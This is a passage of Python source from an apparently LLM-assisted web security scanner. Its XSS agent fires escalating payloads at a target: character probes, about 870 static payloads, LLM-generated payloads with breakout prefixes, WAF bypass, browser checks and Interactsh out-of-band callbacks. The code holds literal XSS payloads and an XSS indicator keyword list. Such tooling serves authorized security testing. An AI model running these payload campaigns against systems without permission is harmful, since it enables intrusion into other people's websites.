            self._cov_level("L6", note=f"{len(reflecting_payloads)} candidates flagged" if result else "")
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.level.completed", {"level": "L6", "param": param, "flagged": bool(result)})
            if result:
                self._cov_exit(xss_coverage.EXIT_FLAGGED_CDP)
                return _tag_method(result)
        else:
            self._cov_note("L6 skipped: no reflecting payloads to flag for CDP")

        dashboard.log(f"[{self.name}] All 6 levels exhausted for '{param}', no XSS confirmed", "WARN")
        self._cov_exit(xss_coverage.EXIT_EXHAUSTED)
        return None

    # ===== ESCALATION LEVEL IMPLEMENTATIONS =====

    async def _escalation_l05_smart_probe(
        self, url: str, param: str, initial_context: str = "html"
    ) -> tuple:
        """
        L0.5: Smart Probe — send char-test probe, detect reflection context,
        try 3-5 targeted payloads based on what survives.

        Returns:
            (XSSFinding or None, reflects: bool, detected_context: str or None,
             detected_contexts: list of EVERY context the probe reflected in,
             probe_status: one of _PROBE_NO_RESPONSE / _PROBE_NO_REFLECTION / _PROBE_REFLECTED)

        probe_status exists because "the target answered nothing" and "the target answered
        without the marker" are opposite facts about the SCAN, and the caller has to be able
        to say which one it observed. Collapsing both into reflects=False is what made the
        pipeline unable to distinguish a dead target from a non-injectable parameter.
        """
        # Send char-testing probe with interleaved sub-markers.
        # Each special char is bracketed by its own unique marker pair so its
        # survival is tested independently of the others.  This eliminates:
        #   - false positives: chars from surrounding HTML counted as surviving
        #   - false negatives: HTML-encoding of an earlier char (e.g. < → &lt;)
        #     shifting subsequent chars out of a fixed-size window
        # Format: BT7331A"BT7331B'BT7331C<BT7331D>BT7331E`BT7331F\BT7331G
        _CHAR_MARKERS = [
            ('"',  'A', 'B'),
            ("'",  'B', 'C'),
            ('<',  'C', 'D'),
            ('>',  'D', 'E'),
            ('`',  'E', 'F'),
            ('\\', 'F', 'G'),
        ]
        probe = _L05_CHAR_PROBE
        response = await self._send_payload(param, probe)
        if not response:
            # _send_payload returns "" on transport failure — no answer at all.
            return None, False, None, [], _PROBE_NO_RESPONSE
        if _LEGACY_PROBE_MARKER not in response:
            return None, False, None, [], _PROBE_NO_REFLECTION

        # Each char survives only if its exact bracketed substring is in the response.
        surviving = ""
        for char, before, after in _CHAR_MARKERS:
            if f"BT7331{before}{char}BT7331{after}" in response:
                surviving += char

        # Detect context via existing analysis
        reflection_info = self._analyze_reflection_context(response, "BT7331")
        detected_context = reflection_info.get("context", initial_context)
        detected_contexts = list(reflection_info.get("contexts") or [])

        # Share what the char probe proved with the later levels (same per-param,
        # sequential convention as _current_http_method): L3 uses it to pick
        # context-appropriate breakouts instead of the globally-ranked list alone.
        self._surviving_chars = surviving

        dashboard.log(
            f"[{self.name}] Smart probe: '{param}' reflects, "
            f"context={detected_context}, chars_survive={surviving}",
            "INFO",
        )

        # Select targeted payloads based on context + surviving chars
        smart = []
        if detected_context == "script":
            smart.append(self.SMART_PAYLOADS["js_sq_breakout"])
            smart.append(self.SMART_PAYLOADS["js_dq_breakout"])
        elif detected_context in ("attribute_value", "event_handler"):
            if '"' in surviving:
                smart.append(self.SMART_PAYLOADS["attr_dq_breakout"])
                smart.append(self.SMART_PAYLOADS["attr_dq_tag_breakout"])
            if "'" in surviving:
                smart.append(self.SMART_PAYLOADS["attr_sq_breakout"])
                smart.append(self.SMART_PAYLOADS["attr_sq_tag_breakout"])
            if '<' in surviving:
                smart.append(self.SMART_PAYLOADS["html_svg"])
        elif detected_context in ("html_text", "raw_text", "unknown"):
            if '<' in surviving:
                smart.append(self.SMART_PAYLOADS["html_svg"])
                smart.append(self.SMART_PAYLOADS["html_img"])
            if '"' in surviving:
                smart.append(self.SMART_PAYLOADS["attr_dq_breakout"])
                smart.append(self.SMART_PAYLOADS["attr_dq_tag_breakout"])
        elif detected_context == "comment":
            smart.append("--><svg onload=document.title=document.domain>")

        # Always try script breakout if < survives
        if '<' in surviving and self.SMART_PAYLOADS["script_breakout"] not in smart:
            smart.append(self.SMART_PAYLOADS["script_breakout"])

        # Dedupe and cap. Cap raised 5 → 7 so the tag-closing '">' candidates are ADDED,
        # never at the cost of dropping a payload that was already being tried.
        smart = list(dict.fromkeys(smart))[:7]

        if not smart:
            return None, True, detected_context, detected_contexts, _PROBE_REFLECTED

        # Test smart payloads
        dashboard.log(
            f"[{self.name}] Smart probe: testing {len(smart)} targeted payloads on '{param}'",
            "INFO",
        )
        for payload in smart:
            resp = await self._send_payload(param, payload)
            if resp:
                evidence = {}
                if self._can_confirm_from_http_response(payload, resp, evidence):
                    dashboard.log(
                        f"[{self.name}] Smart probe: CONFIRMED XSS on '{param}'",
                        "INFO",
                    )
                    finding = XSSFinding(
                        url=url,
                        parameter=param,
                        payload=payload,
                        context=detected_context,
                        validation_method="L0.5_smart_probe",
                        evidence={**evidence, "level": "L0.5", "surviving_chars": surviving},
                        confidence=0.9,
                        status="VALIDATED_CONFIRMED",
                        validated=True,
                    )
                    finding.successful_payloads = [payload]
                    return finding, True, detected_context, detected_contexts, _PROBE_REFLECTED

        return None, True, detected_context, detected_contexts, _PROBE_REFLECTED

    async def _escalation_l1_polyglot(
        self, url: str, param: str, interactsh_url: str, initial_context: str = "html"
    ) -> tuple:
        """
        L1: Send polyglot/omniprobe, check HTTP reflection.

        Returns:
            (XSSFinding or None, detected_context, html_snippet, detected_contexts)
            - detected_context: refined context from live response analysis
            - html_snippet: HTML around the reflection point for L3 LLM
            - detected_contexts: EVERY context the marker reflected in, unranked
        """
        probe = settings.OMNI_PROBE_MARKER
        response = await self._send_payload(param, probe)
        if not response:
            return None, initial_context, "", []

        # Check if probe reflects at all
        if probe not in response:
            logger.info(f"[{self.name}] L1: No reflection for '{param}'")
            return None, initial_context, "", []

        # Analyze reflection context from live response
        detected_context = initial_context
        html_snippet = ""
        detected_contexts = []
        try:
            # marker=probe: this call site holds a REAL marker (OMNI_PROBE_MARKER), unlike
            # the payload-passing call sites, so it must not fall back to the legacy
            # hardcoded one — that is what made every L1 context "none".
            reflection = self._analyze_reflection_context(response, probe, marker=probe)
            if reflection:
                detected_context = reflection.get("context", initial_context)
                detected_contexts = list(reflection.get("contexts") or [])
                html_snippet = (reflection.get("snippet") or "")[:500]
                if detected_context != initial_context:
                    logger.info(
                        f"[{self.name}] L1: Context refined: {initial_context} → {detected_context}"
                    )
        except Exception as e:
            logger.debug(f"[{self.name}] L1: Context analysis failed: {e}")

        # Probe reflects - check if any executable context
        evidence = {}
        if self._can_confirm_from_http_response(probe, response, evidence):
            return XSSFinding(
                url=url, parameter=param, payload=probe, context=evidence.get("execution_context", "html"),
                validation_method="L1_polyglot", evidence={**evidence, "level": "L1"},
                confidence=0.85, status="VALIDATED_CONFIRMED", validated=True
            ), detected_context, html_snippet, detected_contexts

        # Check Interactsh OOB
        if self.interactsh:
            try:
                interactions = await self.interactsh.poll()
                if interactions:
                    if hasattr(self, '_v'):
                        self._v.emit("exploit.xss.interactsh.callback", {"param": param, "level": "L1", "interactions": len(interactions)})
                    return XSSFinding(
                        url=url, parameter=param, payload=probe, context="oob",
                        validation_method="L1_interactsh", evidence={"oob": True, "level": "L1"},
                        confidence=1.0, status="VALIDATED_CONFIRMED", validated=True
                    ), detected_context, html_snippet, detected_contexts
            except Exception:
                pass

        logger.info(f"[{self.name}] L1: Probe reflects but not confirmed for '{param}' (context: {detected_context})")
        return None, detected_context, html_snippet, detected_contexts

    async def _ensure_go_bridge(self) -> bool:
        """Lazy-initialize Go bridge for L2 acceleration. Returns True if available."""
        if self._go_bridge:
            return True
        try:
            concurrency = 50 if not self._detected_waf else 10
            timeout = 5 if not self._detected_waf else 10
            self._go_bridge = GoFuzzerBridge(concurrency=concurrency, timeout=timeout)
            await self._go_bridge.compile_if_needed()
            logger.info(f"[{self.name}] Go bridge initialized for L2 (concurrency={concurrency})")
            return True
        except Exception as e:
            logger.info(f"[{self.name}] Go bridge unavailable, using Python fallback: {e}")
            self._go_bridge = None
            return False

    async def _escalation_l2_static_bombing(
        self, url: str, param: str, interactsh_url: str, context: str = "html"
    ) -> tuple:
        """L2: Fire all curated + GOLDEN payloads. Returns (result, reflecting_payloads).

        Uses Go fuzzer for mass reflection detection (50 concurrent goroutines, ~3s),
        then Python only for confirming the reflecting payloads (~5-10s).
        Falls back to pure Python if Go bridge unavailable.
        """
        # Build payload list: curated first, then GOLDEN
        curated = self.payload_learner.get_prioritized_payloads([])
        golden = [p.replace("{{interactsh_url}}", interactsh_url) for p in self.GOLDEN_PAYLOADS]
        curated = [p.replace("{{interactsh_url}}", interactsh_url) for p in curated]

        # Context-aware prioritization: context-specific payloads FIRST
        context_payloads = []
        if context and context != "html":
            try:
                context_payloads = self.get_payloads_for_context(context, interactsh_url)
                if context_payloads:
                    logger.info(
                        f"[{self.name}] L2: Prioritizing {len(context_payloads)} "
                        f"payloads for context '{context}'"
                    )
            except Exception as e:
                logger.debug(f"[{self.name}] L2: Context payload lookup failed: {e}")

        # Merge and dedupe: context-specific → golden (high quality) → curated
        seen = set()
        all_payloads = []
        for p in context_payloads + golden + curated:
            if p not in seen:
                seen.add(p)
                all_payloads.append(p)

        logger.info(f"[{self.name}] L2: Bombing {len(all_payloads)} static payloads on '{param}'")

        # ===== TRY GO BRIDGE (fast path: ~3s for 870 payloads) =====
        # Go bridge only supports GET — skip for POST params
        method = getattr(self, '_current_http_method', 'GET')
        go_available = await self._ensure_go_bridge() if method == "GET" else False
        if method == "POST":
            logger.info(f"[{self.name}] L2: Skipping Go bridge for POST param '{param}', using Python")
        if go_available:
            try:
                result, reflecting = await self._l2_go_fast_path(
                    url, param, all_payloads, interactsh_url, context
                )
                if result:
                    return result, reflecting

                # Go path completed - check Interactsh and return
                interactsh_result = await self._l2_check_interactsh(url, param, reflecting)
                if interactsh_result:
                    return interactsh_result, reflecting

                logger.info(f"[{self.name}] L2: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
                return None, reflecting
            except Exception as e:
                logger.warning(f"[{self.name}] L2: Go bridge failed ({e}), falling back to Python")

        # ===== PYTHON FALLBACK (slow path: ~150s for 870 payloads) =====
        logger.info(f"[{self.name}] L2: Using Python fallback for {len(all_payloads)} payloads")
        result, reflecting = await self._l2_python_fallback(
            url, param, all_payloads, interactsh_url
        )
        if result:
            return result, reflecting

        interactsh_result = await self._l2_check_interactsh(url, param, reflecting)
        if interactsh_result:
            return interactsh_result, reflecting

        logger.info(f"[{self.name}] L2: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
        return None, reflecting

    async def _l2_go_fast_path(
        self, url: str, param: str, payloads: list, interactsh_url: str, context: str
    ) -> tuple:
        """Go fast path: mass fuzz with Go, confirm reflecting with Python.

        Go fires all 870 payloads in ~3s with 50 goroutines, returns which ones
        reflected. Python then re-tests ONLY those (~5-30) with full HTTP analysis.
        """
        import time
        start = time.time()

        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.go_fuzzer.started", {"param": param, "payload_count": len(payloads)})

        # Step 1: Go mass fuzzing (all payloads in parallel)
        go_result = await self._go_bridge.run(
            url=url, param=param, payloads=payloads
        )

        go_duration = time.time() - start
        reflecting_payloads = [r.payload for r in (go_result.reflections or [])]

        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.go_fuzzer.completed", {"param": param, "total_requests": go_result.total_requests, "reflecting": len(reflecting_payloads), "duration_s": round(go_duration, 1), "rps": round(go_result.requests_per_second)})

        logger.info(
            f"[{self.name}] L2-Go: {go_result.total_requests} payloads tested in "
            f"{go_duration:.1f}s ({go_result.requests_per_second:.0f} req/s), "
            f"{len(reflecting_payloads)} reflecting"
        )

        if not reflecting_payloads:
            return None, []

        # Prioritize: payloads with document.domain/cookie first (higher impact proof)
        def _payload_quality_key(p):
            if "document.domain" in p or "document.cookie" in p:
                return 0
            if "BUGTRACEAI" in p or "BUGTRACE" in p:
                return 1
            return 2

        reflecting_payloads.sort(key=_payload_quality_key)

        # Step 2: Python confirms reflecting payloads (full HTTP analysis)
        logger.info(
            f"[{self.name}] L2-Py: Confirming {len(reflecting_payloads)} "
            f"reflecting payloads with full HTTP analysis"
        )

        confirmed_reflecting = []
        confirmed_payloads = []
        first_finding = None

        for i, payload in enumerate(reflecting_payloads):
            dashboard.set_current_payload(
                payload[:60], "XSS L2-Confirm",
                f"{i+1}/{len(reflecting_payloads)}", self.name
            )

            response = await self._send_payload(param, payload)
            if not response:
                continue

            # Full HTTP confirmation (5 checks including JS string breakout)
            evidence = {}
            if self._can_confirm_from_http_response(payload, response, evidence):
                confirmed_payloads.append(payload)
                if not first_finding:
                    first_finding = XSSFinding(
                        url=url, parameter=param, payload=payload,
                        context=evidence.get("execution_context", "html"),
                        validation_method="L2_go_static_http",
                        evidence={**evidence, "level": "L2", "engine": "go+python"},
                        confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
                    )
                    logger.info(
                        f"[{self.name}] L2: CONFIRMED via Go+Python in "
                        f"{time.time() - start:.1f}s (context: {evidence.get('execution_context', 'unknown')})"
                    )
                if len(confirmed_payloads) >= 5:
                    break
                continue

            # Track as reflecting for L5 browser fallback
            if self._payload_reflects(payload, response):
                confirmed_reflecting.append(payload)

        if first_finding:
            first_finding.successful_payloads = confirmed_payloads
            logger.info(
                f"[{self.name}] L2: {len(confirmed_payloads)} alternative payloads confirmed "
                f"for '{param}'"
            )
            return first_finding, confirmed_reflecting

        return None, confirmed_reflecting

    async def _l2_python_fallback(
        self, url: str, param: str, payloads: list, interactsh_url: str
    ) -> tuple:
        """Pure Python fallback: sequential HTTP requests with analysis."""
        reflecting = []
        confirmed_payloads = []
        first_finding = None

        for i, payload in enumerate(payloads):
            if i % 50 == 0 and i > 0:
                dashboard.log(f"[{self.name}] L2: Progress {i}/{len(payloads)}", "DEBUG")
            if hasattr(self, '_v'):
                self._v.progress("exploit.xss.level.progress", {"level": "L2", "param": param, "total": len(payloads)}, every=50)
            dashboard.set_current_payload(payload[:60], "XSS L2", f"{i+1}/{len(payloads)}", self.name)

            response = await self._send_payload(param, payload)
            if not response:
                continue

            evidence = {}
            if self._can_confirm_from_http_response(payload, response, evidence):
                confirmed_payloads.append(payload)
                if not first_finding:
                    first_finding = XSSFinding(
                        url=url, parameter=param, payload=payload,
                        context=evidence.get("execution_context", "html"),
                        validation_method="L2_static_http",
                        evidence={**evidence, "level": "L2"},
                        confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
                    )
                if len(confirmed_payloads) >= 5:
                    break
                continue

            if self._payload_reflects(payload, response):
                reflecting.append(payload)

        if first_finding:
            first_finding.successful_payloads = confirmed_payloads
            return first_finding, reflecting

        return None, reflecting

    def _payload_carries_oob(self, payload: str) -> bool:
        """True if a payload embeds this scan's Interactsh callback host/correlation id.

        OOB payloads carry a ``{id}.{server}`` URL (e.g. abc123.oast.fun) — the
        literal word "interactsh" NEVER appears, so attribution must match the
        real OAST host or correlation id, not the substring "interactsh".
        """
        if not payload or not self.interactsh:
            return False
        p = payload.lower()
        host = (getattr(self.interactsh, "server", "") or "").lower()
        cid = (getattr(self.interactsh, "correlation_id", "") or "").lower()
        return bool((host and host in p) or (cid and cid in p))

    async def _l2_check_interactsh(self, url: str, param: str, reflecting: list):
        """Check Interactsh for OOB callbacks after L2 bombing."""
        if self.interactsh:
            try:
                interactions = await self.interactsh.poll()
                if interactions:
                    if hasattr(self, '_v'):
                        self._v.emit("exploit.xss.interactsh.callback", {"param": param, "level": "L2", "interactions": len(interactions)})
                    for rp in reflecting:
                        if self._payload_carries_oob(rp):
                            return XSSFinding(
                                url=url, parameter=param, payload=rp, context="oob",
                                validation_method="L2_interactsh",
                                evidence={"oob": True, "level": "L2"},
                                confidence=1.0, status="VALIDATED_CONFIRMED", validated=True
                            )
            except Exception:
                pass
        return None

    async def _escalation_l3_llm_bombing(
        self, url: str, param: str, interactsh_url: str, existing_reflecting: list,
        context: str = "html", probe_snippet: str = ""
    ) -> tuple:
        """L3: Generate LLM payloads (max 10), multiply by breakouts, fire via HTTP."""
        # Use context from L1 analysis, or analyze from existing reflections
        sample_context = context if context != "html" else "html"
        html_snippet = probe_snippet

        if sample_context == "html" and existing_reflecting:
            sample_resp = await self._send_payload(param, existing_reflecting[0])
            if sample_resp:
                ctx = self._analyze_reflection_context(sample_resp, existing_reflecting[0])
                if ctx:
                    sample_context = ctx.get("context", "html")
                    html_snippet = ctx.get("snippet", "")[:500]

        # Ask DeepSeek for visual payloads tailored to context (with HTML snippet)
        visual_payloads = await self._ask_deepseek_visual_payloads(
            param=param, contexts=[sample_context],
            sample_payloads={sample_context: existing_reflecting[0] if existing_reflecting else "<img src=x onerror=alert(1)>"},
            html_snippet=html_snippet
        )

        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.llm_payloads", {"param": param, "count": len(visual_payloads) if visual_payloads else 0, "context": sample_context})

        if not visual_payloads:
            logger.info(f"[{self.name}] L3: LLM generated 0 payloads, skipping")
            return None, []

        # Multiply by breakouts. get_top_breakouts() ranks by global success_count ALONE —
        # no context filter, no surviving-chars filter — so a breakout that actually fits
        # the detected context (e.g. '">' for a double-quoted attribute) can sit outside
        # the limit and never be tried. Union it with the prefixes the shared context
        # table prescribes for this context (single source of truth:
        # tools/manipulator/context_analyzer.CONTEXT_BREAKOUTS) and drop empty prefixes,
        # which only duplicate the base payload. The union is ADDITIVE in BOTH directions:
        # every globally ranked prefix survives it (see merge_breakout_prefixes) and
        # `sample_context` — which may be an LLM-invented label, not this agent's
        # reflection vocabulary — can only widen the set, never narrow it.
        from bugtrace.tools.manipulator.breakout_manager import breakout_manager
        surviving = getattr(self, "_surviving_chars", "")
        breakout_prefixes = merge_breakout_prefixes(
            context_breakout_prefixes(sample_context, surviving),
            [b.prefix for b in breakout_manager.get_top_breakouts(limit=10)],
        )

        # Deterministic tag-closing candidates first: L3 otherwise only ever fires what the
        # LLM invented, so the '"><svg onload=...>' family could stay unreachable.
        amplified = tag_closing_breakout_payloads(sample_context, surviving, self.SMART_PAYLOADS)
        for vp in visual_payloads:
            amplified.append(vp)  # Base payload
            for prefix in breakout_prefixes:
                amplified.append(prefix + vp)

        logger.info(f"[{self.name}] L3: Bombing {len(amplified)} LLM×breakout payloads on '{param}'")

        reflecting = []
        for i, payload in enumerate(amplified):
            if i % 100 == 0 and i > 0:
                dashboard.log(f"[{self.name}] L3: Progress {i}/{len(amplified)}", "DEBUG")
            if hasattr(self, '_v'):
                self._v.progress("exploit.xss.level.progress", {"level": "L3", "param": param, "total": len(amplified)}, every=50)
            dashboard.set_current_payload(payload[:60], "XSS L3", f"{i+1}/{len(amplified)}", self.name)

            response = await self._send_payload(param, payload)
            if not response:
                continue

            evidence = {}
            if self._can_confirm_from_http_response(payload, response, evidence):
                return XSSFinding(
                    url=url, parameter=param, payload=payload, context=evidence.get("execution_context", "html"),
                    validation_method="L3_llm_http", evidence={**evidence, "level": "L3"},
                    confidence=0.90, status="VALIDATED_CONFIRMED", validated=True
                ), reflecting

            if self._payload_reflects(payload, response):
                reflecting.append(payload)

        logger.info(f"[{self.name}] L3: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
        return None, reflecting

    async def _escalation_l4_http_manipulator(
        self, url: str, param: str
    ) -> tuple:
        """L4: ManipulatorOrchestrator - context detection, WAF bypass, blood smell."""
        reflecting = []
        try:
            method = getattr(self, '_current_http_method', 'GET')
            parsed = urllib.parse.urlparse(url)
            base_params = dict(urllib.parse.parse_qsl(parsed.query))
            if param not in base_params:
                base_params[param] = "test"

            if method == "POST":
                base_request = MutableRequest(
                    method="POST",
                    url=url.split("?")[0],
                    params={},
                    data=base_params
                )
            else:
                base_request = MutableRequest(
                    method="GET",
                    url=url.split("?")[0],
                    params=base_params
                )

            manipulator = ManipulatorOrchestrator(
                rate_limit=0.3,
                enable_agentic_fallback=True,
                enable_llm_expansion=True
            )

            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.manipulator.phase", {"param": param, "phase": "process_finding", "strategies": ["PAYLOAD_INJECTION", "BYPASS_WAF"]})

            success, mutation = await manipulator.process_finding(
                base_request,
                strategies=[MutationStrategy.PAYLOAD_INJECTION, MutationStrategy.BYPASS_WAF]
            )

            if success and mutation:
                working_payload = mutation.params.get(param, str(mutation.params))
                original_value = base_params.get(param, "test")

                # Verify the TARGET param was actually mutated (not a different param)
                if working_payload == original_value:
                    logger.info(f"[{self.name}] L4: ManipulatorOrchestrator exploited different param, not '{param}'")
                    await manipulator.shutdown()
                    return None, reflecting

                # Verify payload contains XSS indicators
                xss_indicators = ["<script", "<img", "<svg", "<iframe", "onerror", "onload",
                                  "onclick", "onmouseover", "onfocus", "javascript:", "alert(",
                                  "confirm(", "prompt(", "document.", "eval(", "<div", "<body",
                                  "style=", "expression(", "\\x", "\\u00"]
                if not any(ind.lower() in working_payload.lower() for ind in xss_indicators):
                    logger.info(f"[{self.name}] L4: ManipulatorOrchestrator payload rejected (no XSS syntax): {working_payload[:80]}")
                    await manipulator.shutdown()
                    return None, reflecting

                # The manipulator's EncodingAgent may URL-encode the payload, which httpx then
                # re-encodes (params=) -> the request goes out DOUBLE-encoded. The server reflects
                # the inert percent-literal (e.g. "%3Cdiv"), and the manipulator's substring match
                # falsely "confirms" XSS. Re-verify the DECODED payload with the SAME strict
                # executable-context check used by L2/L3, sent RAW so httpx encodes exactly once.
                # No executable context => it was a false positive; defer to L5 browser (DOM) check.
                decoded_payload = urllib.parse.unquote(working_payload)
                verify_ev: dict = {}
                verify_resp = await self._send_payload(param, decoded_payload)
                if not self._can_confirm_from_http_response(decoded_payload, verify_resp or "", verify_ev):
                    logger.info(f"[{self.name}] L4: manipulator success but decoded payload not executable in response -> rejecting potential FP, deferring to L5: {decoded_payload[:80]}")
                    if verify_resp and self._payload_reflects(decoded_payload, verify_resp):
                        reflecting.append(decoded_payload)
                    await manipulator.shutdown()
                    return None, reflecting

                logger.info(f"[{self.name}] L4: ManipulatorOrchestrator CONFIRMED (strict re-verify): {param}={decoded_payload[:80]}")
                await manipulator.shutdown()
                # Store the RAW (decoded) payload + strict evidence; _can_confirm_from_http_response
                # already stamped a single-encoded confirming_request, so the repro is clean and the
                # base64 backup fires correctly (payload now carries literal <>/quotes again).
                return XSSFinding(
                    url=url, parameter=param, payload=decoded_payload,
                    context=verify_ev.get("execution_context", "html"),
                    validation_method="L4_manipulator_http",
                    evidence={**verify_ev, "level": "L4",
                              "manipulator_strategy": getattr(mutation, '_encoding_strategy', None)},
                    confidence=0.95, status="VALIDATED_CONFIRMED", validated=True
                ), reflecting

            # Collect blood smell candidates as reflecting payloads for L5
            if manipulator.blood_smell_history:
                for entry in sorted(manipulator.blood_smell_history, key=lambda x: x["smell"]["severity"], reverse=True)[:5]:
                    blood_payload = entry["request"].params.get(param, "")
                    if blood_payload:
                        reflecting.append(blood_payload)
                logger.info(f"[{self.name}] L4: {len(reflecting)} blood smell candidates for L5")

            await manipulator.shutdown()

        except Exception as e:
            logger.error(f"[{self.name}] L4: ManipulatorOrchestrator failed: {e}")

        return None, reflecting

    async def _escalation_l5_browser(
        self, url: str, param: str, reflecting_payloads: list, screenshots_dir: Path
    ) -> Optional[XSSFinding]:
        """L5: Browser validation (Playwright) on reflecting payloads."""
        # Dedupe and take top candidates
        seen = set()
        candidates = []
        for p in reflecting_payloads:
            if p not in seen:
                seen.add(p)
                candidates.append(p)

        # Limit to top 10 browser tests (expensive)
        candidates = candidates[:10]
        logger.info(f"[{self.name}] L5: Browser testing {len(candidates)} reflecting payloads on '{param}'")

        for i, payload in enumerate(candidates):
            dashboard.set_current_payload(payload[:60], "XSS L5 Browser", f"{i+1}/{len(candidates)}", self.name)
            if hasattr(self, '_v'):
                self._v.emit("exploit.xss.browser.testing", {"param": param, "index": i + 1, "total": len(candidates), "payload": payload[:80]})
            try:
                browser_result = await self._validate_via_browser(url, param, payload, screenshot_dir=str(screenshots_dir))
                if browser_result:
                    if hasattr(self, '_v'):
                        self._v.emit("exploit.xss.browser.result", {"param": param, "confirmed": True, "method": browser_result.get("method", "playwright")})
                    return XSSFinding(
                        url=url, parameter=param, payload=payload, context="dom",
                        validation_method="L5_browser", evidence={**browser_result, "level": "L5"},
                        confidence=0.95, status="VALIDATED_CONFIRMED", validated=True,
                        screenshot_path=browser_result.get("screenshot_path"),
                    )
            except Exception as e:
                logger.debug(f"[{self.name}] L5: Browser test {i+1} failed: {e}")

        if hasattr(self, '_v'):
            self._v.emit("exploit.xss.browser.result", {"param": param, "confirmed": False, "tested": len(candidates)})
        logger.info(f"[{self.name}] L5: 0/{len(candidates)} confirmed in browser for '{param}'")
        return None

    async def _escalation_l6_cdp(
        self, url: str, param: str, reflecting_payloads: list
    ) -> Optional[XSSFinding]:
        """L6: Flag best reflecting payload for CDP AgenticValidator."""
        if not reflecting_payloads:
            return None

        # Pick best candidate (first one, which came from highest priority level)
        best_payload = reflecting_payloads[0]
        logger.info(f"[{self.name}] L6: Flagging '{param}' for CDP AgenticValidator (payload: {best_payload[:60]})")

        return XSSFinding(
            url=url, parameter=param, payload=best_payload, context="pending_cdp",
            validation_method="L6_cdp_flagged", evidence={"reflecting": True, "level": "L6", "needs_cdp": True},
            confidence=0.5, status="NEEDS_CDP_VALIDATION", validated=True
        )

    async def _generate_specialist_report(self, findings: List[Dict]) -> str:
        import json, aiofiles
        from datetime import datetime
        from bugtrace.core.config import settings
        from bugtrace.core.payload_format import encode_finding_payloads

        # v3.2: Write to specialists/results/ for unified wet→dry→results flow
        scan_dir = getattr(self, 'report_dir', None) or (settings.BASE_DIR / "reports" / self._scan_context.split("/")[-1])
        results_dir = scan_dir / "specialists" / "results"
        results_dir.mkdir(parents=True, exist_ok=True)
        report_path = results_dir / "xss_results.json"

        # Attach a real PoC screenshot to every validated XSS that lacks one.
        # This is the SINGLE chokepoint that feeds the report (xss_results.json ->
        # validated_findings.json), so the screenshot reliably reaches the report
        # — capturing at emit time did not, because the report is rebuilt from
        # these rich finding dicts, not the emitted event. The findings already
        # carry exploit_url, so the capture hits the exact PoC URL.
        for _f in findings:
            try:
                if "xss" in str(_f.get("type", "")).lower() and _f.get("validated"):
                    await self._capture_proof_screenshot(_f)
            except Exception:
                pass

        # v3.2: Base64 encode payloads to prevent JSON escaping issues
        # Complex payloads with <, >, ", ' break JSON without encoding
        encoded_findings = [encode_finding_payloads(f) for f in findings]

        async with aiofiles.open(report_path, 'w') as f:
            await f.write(json.dumps({
                "agent": self.name,
                "timestamp": datetime.now().isoformat(),
                "scan_context": self._scan_context,
                "phase_a": {"wet_count": len(self._dry_findings), "dry_count": len(self._dry_findings), "dedup_method": "llm_context_aware"},
                "phase_b": {"validated_count": len([x for x in findings if x.get("validated")]), "total_findings": len(findings)},
                "findings": encoded_findings,
                "_encoding_note": "payload fields with special chars are base64 encoded as payload_b64"
            }, indent=2))
        logger.info(f"[{self.name}] Report saved: {report_path}")
        return str(report_path)

    async def start_queue_consumer(self, scan_context: str) -> None:
        """TWO-PHASE queue consumer (WET → DRY). Context-aware dedup. NO infinite loop."""
        from bugtrace.agents.specialist_utils import (
            report_specialist_start,
            report_specialist_progress,
            report_specialist_done,
            report_specialist_wet_dry,
            write_dry_file,
        )

        self._queue_mode = True
        self._scan_context = scan_context
        self._v = create_emitter("XSSAgent", self._scan_context)
        logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET → DRY)")

        # v3.2: Load context-aware tech stack for intelligent deduplication
        await self._load_xss_tech_context()

        # Get initial queue depth for telemetry
        queue = queue_manager.get_queue("xss")
        initial_depth = queue.depth()
        report_specialist_start(self.name, queue_depth=initial_depth)
        self._v.emit("exploit.xss.started", {"queue_depth": initial_depth})

        dry_list = await self.analyze_and_dedup_queue()

        # Report WET→DRY metrics for integrity verification
        report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)
        write_dry_file(self, dry_list, initial_depth, "xss")

        if not dry_list:
            logger.info(f"[{self.name}] No findings to exploit after deduplication")
            report_specialist_done(self.name, processed=0, vulns=0)
            self._v.emit("exploit.xss.completed", {"processed": 0, "vulns": 0, "reason": "empty_dry_list"})
            return

        results = await self.exploit_dry_list()

        # Count confirmed vulnerabilities.
        # `_dry_findings` is the list of CANDIDATES queued for testing, NOT confirmations —
        # folding it into this counter reported "4 vulns" on scans that found 0 XSS, and
        # painted the XSS node red in SwarmGraph. Keep the two numbers separate.
        vulns_count = len([r for r in results if r]) if results else 0
        candidates_count = len(self._dry_findings) if hasattr(self, '_dry_findings') else 0

        if results or self._dry_findings:
            # v3.2: Convert XSSFinding dataclasses to dicts for JSON serialization
            # Phase B.3 (Stored XSS) returns dicts, other phases return XSSFinding dataclasses
            findings_as_dicts = [_promote_repro(asdict(r) if is_dataclass(r) else r) for r in results if r] if results else []
            await self._generate_specialist_report(findings_as_dicts)

        # Report completion with final stats
        report_specialist_done(
            self.name,
            processed=len(dry_list),
            vulns=vulns_count
        )
        self._v.emit("exploit.xss.completed", {
            "processed": len(dry_list), "vulns": vulns_count, "candidates": candidates_count,
        })
        logger.info(f"[{self.name}] Queue consumer complete: {vulns_count} confirmed findings from {candidates_count} candidates")

    async def _load_xss_tech_context(self) -> None:
        """
        Load technology stack context from recon data (v3.2).

        Uses TechContextMixin to:
        1. Load tech_profile.json from report directory
        2. Normalize into server/lang/framework context
        3. Generate XSS-specific prime directive for LLM prompts

        This context helps focus XSS payloads on the detected frontend/backend stack.
        """
        # Resolve report directory
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            # Fallback: construct from scan_context
            scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
            scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None

        if not scan_dir or not Path(scan_dir).exists():
            logger.debug(f"[{self.name}] No report directory found, using generic tech context")
            self._tech_stack_context = {"db": "generic", "server": "generic", "lang": "generic"}
            self._xss_prime_directive = ""
            return

